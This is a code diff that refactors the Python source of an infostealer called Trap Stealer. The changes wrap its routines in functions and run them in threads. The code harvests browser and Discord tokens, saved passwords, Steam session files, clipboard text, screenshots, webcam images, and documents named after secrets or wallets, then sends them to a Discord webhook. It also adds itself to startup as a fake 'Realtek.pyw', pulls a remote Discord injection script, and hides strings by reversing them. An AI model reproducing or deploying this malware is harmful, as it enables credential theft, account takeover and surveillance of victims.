@@ -28,12 +28,12 @@ import shutil, json
 import win32clipboard
 ### CONFIG ### 
 
+
 webhook = '' #Put ur webhook
 
 injection = False # If set to False it will not inject into discord
 fakeerror = False # If True it will make an fake error message at the end
 Startup = False # If True it will add the file into the startup folder
-shitty_message = False # If True it will print fake message, if you want to disable it replace with False
 antidebugging = False # If set to false it will dont check for VM or Debugger
 DiscordStop = False # If set to True it will make discord cannot be launched again by just removing content from startup file #----- IT WILL DISABLE INJECTION -----#
 StartupMessage = 'An error occurred while trying to add Trap Stealer to the Startup folder.     Or maybe you just put Startup = False' # The Startup message is like that at the start and change if Startup is set to True
@@ -117,11 +117,6 @@ class DATA_BLOB(Structure):
     ]
 
 
-if shitty_message == True:
-    print('Importing Module...')
-else:
-    pass
-
 file_path = os.path.realpath(__file__)
 USER_NAME = getpass.getuser()
 
@@ -172,7 +167,10 @@ def Clipboard():
 
     return clipboard_data
 
-clipboardtext = Clipboard()
+try:
+    clipboardtext = Clipboard()
+except:
+    pass
 
 path = f"{os.getenv('appdata')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Realtek.pyw"
 
@@ -198,7 +196,6 @@ try:
         pass
 except:
     pass
-ind = "sj.xedni"
 
 def LoadUrlib(hook, data='', files='', headers=''):
     for i in range(8):
@@ -224,7 +221,8 @@ for modl in requirements:
         subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
         time.sleep(3)
 
-Dscptb= 'BTPdrocsiD'[::-1];Dsccana = 'yranaCdrocsiD'[::-1];Dscdev = 'tnempoleveDdrocsiD'[::-1]
+Dscptb= 'BTPdrocsiD'[::-1];Dsccana = 'yranaCdrocsiD'[::-1]
+Dscdev = 'tnempoleveDdrocsiD'[::-1]
 def NoDiscord():
     folder_list = f['Discord', f'{Dsccana}', f'{Dscptb}', f'{Dscdev}']
     for folder_name in folder_list:
@@ -246,10 +244,11 @@ try:
 except:
     pass
 
-#Do not touch
+ind = "sj.xedni"
+
+#You can put an custom one only if there %webhook% in the script
+
 inj_url = f"https://raw.githubusercontent.com/TheCuteOwl/Trap-Stealer/main/{ind[::-1]}"
-
-
 
 def inj_discord():
     folder_list = f['Discord', f'{Dsccana}', f'{Dscptb}', f'{Dscdev}']
@@ -265,12 +264,8 @@ def inj_discord():
                             f.write(inj_content)
 
 if injection == True:
-    try:
-
-        inj_discord()
-
+    try:inj_discord()
     except:pass
-
 else:pass
 
 pas = 'drowssaP'
@@ -322,9 +317,6 @@ def globalInfo():
     globalinfo = f":flag_{country_code}: - `{username.upper()} | {ip} ({country}, {city})`\nMore Information 👀 : \n :flag_{country_code}: - `({region}) ({postal})` \n 💻 PC Information : \n`{computer_name}`\n Cores: `{cores}` \nGPU : `{gpu}` \nLatitude + Longitude  : {latitude}, {longitude} "
     return globalinfo
 
-globalinfo = globalInfo()
-
-
 # ALL PATH
 local = os.getenv('LOCALAPPDATA')
 roaming = os.getenv('APPDATA')
@@ -338,7 +330,6 @@ pictures_path = os.path.join(home_dir, 'Pictures')
 
 Threadlist = []
 
-# Discord Badge
 badgeList =  [
         {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
         {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
@@ -351,11 +342,6 @@ badgeList =  [
         {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
         {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
     ]
-
-if shitty_message == True:
-    print('Adding Requests...')
-else:
-    pass
 
 
 def get_uhq_friends(tokq):
@@ -644,241 +630,156 @@ def getPassw(path, arg):
     writeforfile(Passw, 'passw')
 
 
-sysinfo = systemInfo()
-data = {
-    "username": "Trap Stealer",
-    "content": "@everyone someone launched it",
-    "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
-    "embeds": [
-        {
-            "title": "🍪 Trap Stealer Information",
-            "description": f"{globalinfo}\n**👀 Even more information** : \n {sysinfo}\n\n**Startup** : {StartupMessage}\nClipboard text : ```{clipboardtext}```",
-            "color": 0xffb6c1,
-            "thumbnail": {
-                "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
-            },
-            "footer": {
-                "text": "Trap Stealer | https://github.com/TheCuteOwl",
-                "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
-            }
-        }
-    ]
-}
-
-
-LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
-
-if shitty_message == True:
-    print('Everything Installed...')
-else:
-    pass
-
-def GatherAll():
-    browserPaths = [        [f"{roaming}/Opera Software/Opera GX Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
-        [f"{roaming}/Opera Software/Opera Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
-        [f"{roaming}/Opera Software/Opera Neon/User Data/Default", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnknn" ],
-        [f"{local}/Google/Chrome/User Data", "chrome.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
-        [f"{local}/Google/Chrome SxS/User Data", "chrome.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
-        [f"{local}/BraveSoftware/Brave-Browser/User Data", "brave.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
-        [f"{local}/Yandex/YandexBrowser/User Data", "yandex.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
-        [f"{local}/Microsoft/Edge/User Data", "edge.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ]
-    ]
-    discordPaths = [        [f"{roaming}/Discord", "/Local Storage/leveldb"],
-        [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
-        [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
-        [f"{roaming}/discordptb", "/Local Storage/leveldb"],
-    ]
-    Threadlist = []
-    for patt in browserPaths:
-        a = threading.Thread(target=getTokq, args=[patt[0], patt[2]])
-        a.start()
-        Threadlist.append(a)
-    for patt in discordPaths:
-        a = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
-        a.start()
-        Threadlist.append(a)
-    for patt in browserPaths:
-        a = threading.Thread(target=getPassw, args=[patt[0], patt[3]])
-        a.start()
-        Threadlist.append(a)
-
-    for thread in Threadlist:
-        thread.join()
-    file = os.getenv("TEMP") + f"\wppassw.txt"; filename = "wppassw.txt"
-
-    a = upload_file(file)
-    embed_fields = [{"name": f"{filename}", "value": f"[Click here to download]({a})"}]
-    pas = 'drowssaP'
-    data = {
-        "username": "Trap Stealer",
-        "content": "",
-        "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
-        "embeds": [
-            {
-                "title": f"🍪 Trap Stealer {pas[::-1]}",
-                "description": f"{pas[::-1]} File URL : ",
-                "color": 0xffb6c1,
-                "fields": embed_fields,
-                "thumbnail": {
-                    "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
-                },
-                "footer": {
-                    "text": "Trap Stealer | https://github.com/TheCuteOwl",
-                    "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+def getinfo():
+    try:
+        sysinfo = systemInfo()
+        globalinfo = globalInfo()
+        data = {
+            
+            "username": "Trap Stealer",
+            "content": "@everyone someone launched it",
+            "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
+            "embeds": [
+                {
+                    "title": "🍪 Trap Stealer Information",
+                    "description": f"{globalinfo}\n**👀 Even more information** : \n {sysinfo}\n\n**Startup** : {StartupMessage}\nClipboard text : ```{clipboardtext}```",
+                    "color": 0xffb6c1,
+                    "thumbnail": {
+                        "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
+                    },
+                    "footer": {
+                        "text": "Trap Stealer | https://github.com/TheCuteOwl",
+                        "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                    }
                 }
+            ]
+        }
+        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+    except:pass
+
+def steam_st():
+    try:
+        steam_path = ""
+        if os.path.exists(os.environ["PROGRAMFILES(X86)"]+"\\steam"):
+            steam_path = os.environ["PROGRAMFILES(X86)"]+"\\steam"
+            ssfn = []
+            config = ""
+            for file in os.listdir(steam_path):
+                if file[:4] == "ssfn":
+                    ssfn.append(steam_path+f"\\{file}")
+            def steam(path,path1,steam_session):
+                for root,dirs,file_name in os.walk(path):
+                    for file in file_name:
+                        steam_session.write(root+"\\"+file)
+                for file2 in path1:
+                    steam_session.write(file2)
+            if os.path.exists(steam_path+"\\config"):
+                with zipfile.ZipFile(f"{os.environ['TEMP']}\steam_session.zip",'w',zipfile.ZIP_DEFLATED) as zp:
+                    steam(steam_path+"\\config",ssfn,zp)
+
+                headers = {
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+                    } 
+
+            file = {"file": open(f"{os.environ['TEMP']}\steam_session.zip", "rb")}
+            data = {
+                "username": "Trap Stealer",
+                "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
+                "content": "Here the Steam Session file"
             }
-        ]
-    }
-    LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+
+            response = requests.post(webhook, files=file, data=data)
+            try:
+
+                os.remove(f"{os.environ['TEMP']}\steam_session.zip")
+
+            except:
+                pass
+    except:pass
 
 
-
-
-
-keyword = [
-    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
-]
-
-GatherAll() 
-
-""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
-
-######################################################
 keywords = ["drowssap", "tellaw", "essap_edotom", "pdm", "essapedotom", "noken", "yek", "terces", "tterces", "ipa", "tnuocca", "nogin", "emusern", "liame", "enohp", "dircet tihcrac", "ytiruces yrtnuoces laicos", "sserdda", "etisoppa", "NIP", "trossap", "eciffo laicion", "dnocesorp", "tnuocca knalb", "gnitirw", "ytocryptocurrency", "niotcib", "muhtyre", "etelpmoc", "evig", "noitartsinimda"]
 extension = ".txt"
 
 
-import concurrent.futures
+def filing():
+    try:
+        import concurrent.futures
 
-file_paths = []
+        file_paths = []
 
-for path in [desktop_path, downloads_path, documents_path, pictures_path]:
-    for file in os.listdir(path):
-         if file.endswith(extension) and any(keyword[::-1] in file for keyword in keywords):
-                file_path = os.path.join(path, file) 
-                file_paths.append(file_path)
-
-
-urls = []
-
-with concurrent.futures.ThreadPoolExecutor() as executor:
-    futures = []
-    for file_path in file_paths:
-        futures.append(executor.submit(upload_file, file_path))
-    for future, file_path in zip(futures, file_paths):
-        url = future.result()
-        if url:
-            urls.append((os.path.basename(file_path), url))
-        else:
-            pass
+        for path in [desktop_path, downloads_path, documents_path, pictures_path]:
+            for file in os.listdir(path):
+                if file.endswith(extension) and any(keyword[::-1] in file for keyword in keywords):
+                        file_path = os.path.join(path, file) 
+                        file_paths.append(file_path)
 
 
+        urls = []
 
-if urls:
-    embed_fields = [{"name": f"{i+1}. {file}", "value": f"[Click here to download]({url})"} for i, (file, url) in enumerate(urls)]
+        with concurrent.futures.ThreadPoolExecutor() as executor:
+            futures = []
+            for file_path in file_paths:
+                futures.append(executor.submit(upload_file, file_path))
+            for future, file_path in zip(futures, file_paths):
+                url = future.result()
+                if url:
+                    urls.append((os.path.basename(file_path), url))
+                else:
+                    pass
 
-    data = {
-        "username": "Trap Stealer",
-        "content": "",
-        "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
-        "embeds": [
-            {
-                "title": "🍪 Trap Stealer Files",
-                "description": "New files have been uploaded:",
-                "color": 0xffb6c1,
-                "fields": embed_fields,
-                "thumbnail": {
-                    "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
-                },
-                "footer": {
-                    "text": "Trap Stealer | https://github.com/TheCuteOwl",
-                    "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
-                }
+
+
+        if urls:
+            embed_fields = [{"name": f"{i+1}. {file}", "value": f"[Click here to download]({url})"} for i, (file, url) in enumerate(urls)]
+
+            data = {
+                "username": "Trap Stealer",
+                "content": "",
+                "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
+                "embeds": [
+                    {
+                        "title": "🍪 Trap Stealer Files",
+                        "description": "New files have been uploaded:",
+                        "color": 0xffb6c1,
+                        "fields": embed_fields,
+                        "thumbnail": {
+                            "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
+                        },
+                        "footer": {
+                            "text": "Trap Stealer | https://github.com/TheCuteOwl",
+                            "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                        }
+                    }
+                ]
             }
-        ]
-    }
 
-LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+    except:
+        pass
 
-user = os.path.expanduser("~")
+def screens():
+    try:
+        user = os.path.expanduser("~")
+        img = ImageGrab.grab()
+        img_path = os.path.join(user, "AppData", "Local", "Temp", "ss.png")
+        img.save(img_path)
+        file = {"file": open(img_path, "rb")}
 
-def steam_st():
-    steam_path = ""
-    if os.path.exists(os.environ["PROGRAMFILES(X86)"]+"\\steam"):
-        steam_path = os.environ["PROGRAMFILES(X86)"]+"\\steam"
-        ssfn = []
-        config = ""
-        for file in os.listdir(steam_path):
-            if file[:4] == "ssfn":
-                ssfn.append(steam_path+f"\\{file}")
-        def steam(path,path1,steam_session):
-            for root,dirs,file_name in os.walk(path):
-                for file in file_name:
-                    steam_session.write(root+"\\"+file)
-            for file2 in path1:
-                steam_session.write(file2)
-        if os.path.exists(steam_path+"\\config"):
-            with zipfile.ZipFile(f"{os.environ['TEMP']}\steam_session.zip",'w',zipfile.ZIP_DEFLATED) as zp:
-                steam(steam_path+"\\config",ssfn,zp)
-
-            headers = {
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
-                } 
-
-        file = {"file": open(f"{os.environ['TEMP']}\steam_session.zip", "rb")}
         data = {
             "username": "Trap Stealer",
-            "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
-            "content": "Here the Steam Session file"
+            "content": "Screen was successfully taken",
+            "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png"
         }
 
         response = requests.post(webhook, files=file, data=data)
         try:
-
-            os.remove(f"{os.environ['TEMP']}\steam_session.zip")
-
+            os.remove(img_path)
         except:
             pass
-
-
-try:
-    steam_st()
-except:
-    pass
-
-
-def screen():
-
-    img = ImageGrab.grab()
-    img_path = os.path.join(user, "AppData", "Local", "Temp", "ss.png")
-    img.save(img_path)
-    file = {"file": open(img_path, "rb")}
-
-    data = {
-        "username": "Trap Stealer",
-        "content": "Screen was successfully taken",
-        "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png"
-    }
-
-    response = requests.post(webhook, files=file, data=data)
-
-    try:
-        os.remove(img_path)
     except:
-        pass
-
-
-
-if shitty_message == True:
-    print('Starting..')
-else:
-    pass
-
-try:
-    screen()
-except:
-    data = {
+        data = {
         "username": "Trap Stealer",
         "content": "",
         "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
@@ -899,8 +800,8 @@ except:
     }
     LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
 
-def Camera_get():
 
+def Camera_get():
     try:
         subprocess.run(["fswebcam", "-q", "image.jpg"])
 
@@ -941,6 +842,105 @@ def Camera_get():
         }
 
         LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+
+        
+def paaz():
+    try:
+        file = os.getenv("TEMP") + f"\wppassw.txt"
+        filename = "wppassw.txt"
+
+        a = upload_file(file)
+        embed_fields = [{"name": f"{filename}", "value": f"[Click here to download]({a})"}]
+        pas = 'drowssaP'
+        data = {
+            "username": "Trap Stealer",
+            "content": "",
+            "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
+            "embeds": [
+                {
+                    "title": f"🍪 Trap Stealer {pas[::-1]}",
+                    "description": f"{pas[::-1]} File URL : ",
+                    "color": 0xffb6c1,
+                    "fields": embed_fields,
+                    "thumbnail": {
+                        "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
+                    },
+                    "footer": {
+                        "text": "Trap Stealer | https://github.com/TheCuteOwl",
+                        "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                    }
+                }
+            ]
+        }
+        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+    except:pass
+
+def GatherAll():
+    browserPaths = [        
+        [f"{roaming}/Opera Software/Opera GX Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
+        [f"{roaming}/Opera Software/Opera Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
+        [f"{roaming}/Opera Software/Opera Neon/User Data/Default", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnknn" ],
+        [f"{local}/Google/Chrome/User Data", "chrome.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
+        [f"{local}/Google/Chrome SxS/User Data", "chrome.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
+        [f"{local}/BraveSoftware/Brave-Browser/User Data", "brave.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
+        [f"{local}/Yandex/YandexBrowser/User Data", "yandex.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
+        [f"{local}/Microsoft/Edge/User Data", "edge.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ]
+    ]
+    discordPaths = [        
+        [f"{roaming}/Discord", "/Local Storage/leveldb"],
+        [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
+        [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
+        [f"{roaming}/discordptb", "/Local Storage/leveldb"],
+    ]
+    Threadlist = []
+    a = threading.Thread(target=getinfo)
+    a.start()
+    Threadlist.append(a)
+
+    for patt in browserPaths:
+        tokq = threading.Thread(target=getTokq, args=[patt[0], patt[2]])
+        tokq.start()
+        Threadlist.append(tokq)
+    for patt in discordPaths:
+        di = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
+        di.start()
+        Threadlist.append(di)
+    threadlist2 = []
+    for patt in browserPaths:
+        pa = threading.Thread(target=getPassw, args=[patt[0], patt[3]])
+        pa.start()
+        threadlist2.append(pa)
+
+    fi = threading.Thread(target=filing)
+    fi.start()
+    Threadlist.append(fi)
+
+    scr = threading.Thread(target=screens)
+    scr.start()
+    Threadlist.append(scr)
+
+    for thread in threadlist2:
+        thread.join()
+    
+    paz = threading.Thread(target=paaz)
+    paz.start()
+    Threadlist.append(paz)
+    
+    cam = threading.Thread(target=Camera_get)
+    cam.start()
+    Threadlist.append(cam)
+
+
+
+
+
+
+keyword = [
+    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
+]
+
+GatherAll() 
+
 
 if fakeerror == True:
 
